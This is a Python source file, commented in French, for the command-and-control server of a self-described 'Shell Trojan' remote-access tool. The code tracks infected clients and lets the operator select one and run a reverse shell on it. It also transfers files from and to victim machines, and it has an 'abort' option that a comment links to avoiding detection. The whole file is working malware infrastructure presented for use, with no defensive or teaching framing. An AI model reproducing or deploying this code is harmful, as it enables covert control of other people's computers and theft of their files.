import socket 
import subprocess
import re
import os
import tabulate
import tqdm
#----------------------------------
from datetime import datetime
from threading import Thread
from art import tprint 



SERVER_HOST = "0.0.0.0" # Ecoute sur toutes les interfaces 
SERVER_PORT = 2024      # Port d'écoute 
BUFFER_SIZE = 1440      # Taille MTU
SEPARATOR   = "<sep>"   # séparateur pour les données echangé 


class Server:
   
    def __init__(self, host, port):
        self.host = host
        self.port = port
        # Initialisation du socket 
        self.server_socket = self.get_server_socket()
        # Dictionnaire pour mapper chaque client avec son socket 
        self.clients = {}
        # Dictionnaire pour mapper chaque client avec son working directory 
        self.clients_cwd = {}
        # Client selectionner par le server, le client son selectionne via leur indices 
        self.current_client = None
        self.verbose = True
        
    def print_baniere(self):
        print("\n"+"="*100+"\n"+"+"*100)
        tprint(
            text=" Shell Trojan",
            font='rnd-small',
        )
        print("\n"+"#"*100+"\n"+"-"*100)

    def get_server_socket(self, custom_port=None):
        """
            Cette methode sera utiliser pour lier le socket server sur celui du client 
            Le client se lie au port server d'ecoute 
            Donc le server egalement doit se lier au port utiliser par client 
        """ 
        # Creation du socket 
        s = socket.socket()
        if custom_port: # Si un client tente une connexion alors le socket se creer avec son port 
            port = custom_port
        else: # Si aucun client n'est en ligne alors conserver le socket du server 
            port = self.port
        # Liaison de l'interface server au socket 
        s.bind((self.host, port))
        # Rendre le socket reutilisable
        # Pour permettre a un ancienne client de se connecter a nouveau 
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.listen()
        print("\n\n")
        print(f" Server en ecoute sur : [{SERVER_HOST}:{port} ] ".center(80,'~')) # Information a afficher dans les log et non sur l'interface
        return s
    
    def accept_connection(self):
        while True:
            # Accepter une connexion entamer par un client 
            try:
                client_socket, client_address = self.server_socket.accept()
            except OSError as e:
                print(" ! Server socket fermer ! ".center())
                break
            else:
                print(" \n\n ")
                print(tabulate.tabulate(
                                    [
                                        [  
                                            "Nouveau client connecté !", 
                                            f" {client_address[0]}:{client_address[1]}", 
                                            f"{datetime.now().time()}"
                                        ]
                                    ],

                                    headers = [
                                                "Notification", 
                                                "Détails",
                                                "Time"
                                    ]
                ))
                # Reception du repertoire de travail du client 
                cwd = client_socket.recv(BUFFER_SIZE).decode()
                print("[+] Working directory en cours : ", cwd)
                # Ajout du client au dictionnaire 
                self.clients[client_address] = client_socket
                self.clients_cwd[client_address] = cwd

    def accept_connections(self):
        # Accepter les nouveaux clients avec des threads separer (Multithreading)
        self.connection_thread = Thread(target=self.accept_connection) 
        # Rendre les thread executable en Arriere-plan comme processus daemon(Asynchronisme)
        self.connection_thread.daemon = True
        self.connection_thread.start()
    
    def close_connections(self):
        # Fermeture de toutes les connexions initialise avec des clients 
        if len(self.clients) != 0 : 
            for _, client_socket in self.clients.items():
                client_socket.close()
            self.server_socket.close()
        else : 
            print(" Aucun client Trojan en ligne actuellement ! ")
    
    def start_interpreter(self):
        """ Interface de communicatiomn avec le client """
        while True:
            try : 
                command = input("\n\t>> [.-Shell-RAT-.]+++[-_-]  #>> ").strip() # Invite de commande 
            except KeyboardInterrupt as e: 
                print("\n\n")
                conf = input("\n\t\t Confirmer la fermeture d'urgence ...( Y / N ) > ").lower().lstrip()
                if conf in ["yes",'oui','y','o']:
                    break

            if re.search(r"list\w*", command) or re.search(r"showall\w*", command):
                # Lister tous les clients actifs 
                connected_clients = []
                for index, ((client_host, client_port), cwd) in enumerate(self.clients_cwd.items()):
                    connected_clients.append([index, client_host,client_port, cwd])
                    # Affichage des clients dans un tableau formatter 
                    print(tabulate.tabulate(connected_clients, headers=[" Index "," Addresse ", " Port ", " CWD "]))

            elif (match := re.search(r"use\s*(\w*)", command)):
                try:
                    # Recuperer Index client passer en parametre 
                    client_index = int(match.group(1))
                except ValueError:
                    # si un parametre incorrect est passer en parametre 
                    print(" Selectionner un index client valide! plus d'info taper <help> ou <aide> ")
                    continue
                else:
                    try:
                        self.current_client = list(self.clients)[client_index]
                    except IndexError:
                        print(f" Selectionner un index client compris dans la liste ! Taper <list> ou <showall> pour voir les clients actifs")
                        continue
                    else:
                        # Debuter le Shell reverse sur le client selectionner 
                        self.start_reverse_shell()
            
            elif command.lower() in ["exit", "quit","quitter"]:
                # Ecrire dans les logs fermeture de l'interpreteur server ! 
                break
            elif command == "":
                # Si aucaune commande n'est saisit, ne rien faire 
                pass
            else:
                print("\t\t >>  [info] : Commande invalide :( ! ", command) # >>>>>> Ecrire dans les logs 

        self.close_connections()

    def start(self):
        """
            Method responsible for starting the server:
            Accepting client connections and starting the main interpreter
        """
        self.print_baniere()
        self.start_interpreter()
        self.accept_connections()
        
    
    def start_reverse_shell(self):
        # Recuperer le repertoire de travail du client 
        cwd = self.clients_cwd[self.current_client]
        # Recuperer le deuxieme socket 
        client_socket = self.clients[self.current_client]

        # Debut du shell reverse sur le client a partir du repertoire de travail du client 
        while True:
            # Prompt permettant d'entrer les commandes et de les envoyer aux clients  
            command = input(f"{cwd} $> ")
            if not command.strip():
                # Commande vide 
                continue
            if (match := re.search(r"local\s*(.*)", command)): # La commande local te permet d'executer des commandes sur le serveur et non sur le client 
                local_command = match.group(1)
                if (cd_match := re.search(r"cd\s*(.*)", local_command)):
                    # Si la commande c'est <cd>,  changer de repertoire au lieu de recuperer la sortie du shell avec <subprocess.getouput>
                    # La methode <subprocess.getoutput> te permet de recuperer le flux de sortie d'une commande executer depuis le shell 
                    cd_path = cd_match.group(1) # Recupere le chemin du repertoire passer en parametre 
                    if cd_path:
                        os.chdir(cd_path) # On change de repertoire 
                else:
                    local_output = subprocess.getoutput(local_command) # Sinon exceter la commande en local et afficher la sortie 
                    print(local_output)
                # Les commandes locals (start by local) ne sont pas envoyer au client mais son executer directement sur le serveur 
                continue

            # Commande destiner au client 
            client_socket.sendall(command.encode()) # Envoie de la commande au client 
            if command.lower() in ["exit", "quit"]:
                # Casser la boucle pour quitter le Shell  du client sans fermer la session car le socket a ete rendu reutilisable 
                break
            elif command.lower() == "abort":# " Abondonner " Pour effacer le client de la liste des clients actifs et quitter ! Risque de detection n
                del self.clients[self.current_client]
                del self.clients_cwd[self.current_client]
                break
            elif (match := re.search(r"download\s*(.*)", command)):
                # receive the file
                self.receive_file()
            elif (match := re.search(r"download\s*(.*)", command)):
                # receive the file
                self.receive_file()
            elif (match := re.search(r"upload\s*(.*)", command)):
                # send the specified file if it exists
                filename = match.group(1)
                if not os.path.isfile(filename):
                    print(f"The file {filename} does not exist in the local machine.")
                else:
                    self.send_file(filename)
            # retrieve command results
            output = self.receive_all_data(client_socket,BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # update the cwd
            self.clients_cwd[self.current_client] = cwd
            # print output
            print(results)
        self.current_client = None
    
    def receive_all_data(self, socket, buffer_size):
        """
            Function responsible for calling socket.recv()
            repeatedly until no data is to be received
        """
        data = b""
        while True:
            output = socket.recv(buffer_size)
            data += output
            if not output or len(output) < buffer_size:
                break
        return data
    
    def receive_file(self, port=2023):
        # make another server socket with a custom port
        s = self.get_server_socket(custom_port=port)
        # accept client connections
        client_socket, client_address = s.accept()
        print(f"{client_address} connected.")
        # receive the file
        Server._receive_file(client_socket)
    
    def send_file(self, filename, port=2023):
        # make another server socket with a custom port
        s = self.get_server_socket(custom_port=port)
        # accept client connections
        client_socket, client_address = s.accept()
        print(f"{client_address} connected.")
        # receive the file
        Server._send_file(client_socket, filename)
    
    @classmethod
    def _receive_file(cls, s: socket.socket, buffer_size=4096):
        # receive the file infos using socket
        received = s.recv(buffer_size).decode()
        filename, filesize = received.split(SEPARATOR)
        # remove absolute path if there is
        filename = os.path.basename(filename)
        # convert to integer
        filesize = int(filesize)
        # start receiving the file from the socket
        # and writing to the file stream
        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                bytes_read = s.recv(buffer_size)
                if not bytes_read:
                    # nothing is received
                    # file transmitting is done
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        # close the socket
        s.close()

    @classmethod
    def _send_file(cls, s: socket.socket, filename, buffer_size=4096):
        # get the file size
        filesize = os.path.getsize(filename)
        # send the filename and filesize
        s.send(f"{filename}{SEPARATOR}{filesize}".encode())
        # start sending the file
        progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
        with open(filename, "rb") as f:
            while True:
                # read the bytes from the file
                bytes_read = f.read(buffer_size)
                if not bytes_read:
                    # file transmitting is done
                    break
                # we use sendall to assure transimission in
                # busy networks
                s.sendall(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
        # close the socket
        s.close()

if __name__ == "__main__":
    server = Server(SERVER_HOST, SERVER_PORT)
    try : 
        server.start()
    except Exception as e :
        server.close_connections()
    